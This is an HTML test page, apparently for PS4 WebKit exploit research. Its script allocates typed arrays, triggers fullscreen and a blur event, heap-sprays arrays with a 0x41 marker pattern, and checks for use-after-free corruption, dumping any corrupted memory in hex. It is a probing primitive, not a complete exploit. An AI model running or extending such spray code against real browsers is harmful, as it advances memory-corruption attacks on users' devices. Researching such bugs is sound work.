<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF Audit – Fullscreen + Blur 22222</title>
</head>
<body>

<h1>PS4 WebKit – UAF Audit (No Teardown) 55555</h1>

<button onclick="startTest()">START TEST</button>
<pre id="log"></pre>

<script>
const log = (m) => {
    document.getElementById("log").textContent += m + "\n";
};

let victims = [];
let spray = [];
let corruptedIndex = -1;

function startTest() {
    log("[*] Initializing test");

    victims = [];
    spray = [];
    corruptedIndex = -1;

    // Step 1: Allocate victim arrays
    for (let i = 0; i < 4000; i++) {
        let a = new Float64Array(8);
        a[0] = i + 0.123;
        victims.push(a);
    }

    log("[+] Victim Float64Arrays allocated: " + victims.length);

    // Step 2: Enter fullscreen
    document.documentElement.webkitRequestFullscreen();
    log("[*] Fullscreen requested");

    // Step 3: Blur handler ONLY
    window.onblur = () => {
        log("[*] Blur event triggered");

        // Step 4: Spray AFTER blur
        for (let i = 0; i < 8000; i++) {
            let s = new Float64Array(8);
            s.fill(2.121995791e-314); // 0x4141414141414141
            spray.push(s);
        }

        log("[+] Spray executed: " + spray.length);

        // Step 5: Delayed verification (no teardown)
        setTimeout(verify, 200);
    };
}

function verify() {
    log("[*] Verifying victim integrity");

    for (let i = 0; i < victims.length; i++) {
        if (victims[i][0] === 2.121995791e-314) {
            corruptedIndex = i;
            break;
        }
    }

    if (corruptedIndex === -1) {
        log("[-] NO CORRUPTION DETECTED");
        log("[!] This indicates NO UAF on Float64Array backing store");
    } else {
        log("[!!!] POSSIBLE UAF DETECTED");
        log("[+] Victim index: " + corruptedIndex);

        for (let i = 0; i < 8; i++) {
            let buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = victims[corruptedIndex][i];
            let hex = new BigUint64Array(buf)[0].toString(16);
            log("    [" + i + "] = 0x" + hex);
        }
    }

    log("[*] Test completed WITHOUT teardown");
}
</script>

</body>
</html>
